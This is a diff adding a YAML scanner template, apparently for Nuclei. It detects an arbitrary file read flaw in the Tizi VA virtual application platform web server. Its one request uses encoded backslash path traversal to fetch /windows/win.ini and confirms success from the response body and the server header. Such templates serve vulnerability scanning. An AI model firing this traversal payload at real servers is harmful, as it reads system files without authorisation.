@@ -1,0 +1,28 @@
+id: poc-yaml-tizi-va-web-server-path-traversal
+info:
+  name: 霆智科技 VA虚拟应用平台 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "; for 16-bit app support"
+      - type: word
+        part: header
+        words:
+          - "VA Web Server"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
